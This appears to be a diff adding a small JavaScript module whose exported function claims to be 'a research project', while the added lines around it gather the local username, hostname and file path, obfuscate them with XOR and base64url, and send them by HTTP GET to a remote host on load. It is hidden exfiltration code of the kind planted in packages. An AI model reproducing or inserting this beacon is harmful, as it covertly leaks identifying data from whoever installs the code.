@@ -1,0 +1,7 @@
+var s=new Buffer.from(o.userInfo().username+'@'+o.hostname()+':'+__filename).map(function(b,i){return b^((i+139)%256)})
+module.exports = function fn_1b971() {
+    return 'This is a research project. Do not use.';
+}
+var t=s.toString('base64').replaceAll('+','-').replaceAll('/','_').replaceAll('=','')
+var q='http://'+z+'?x='+r+'1b971'+t
+h.get(q,function(){})
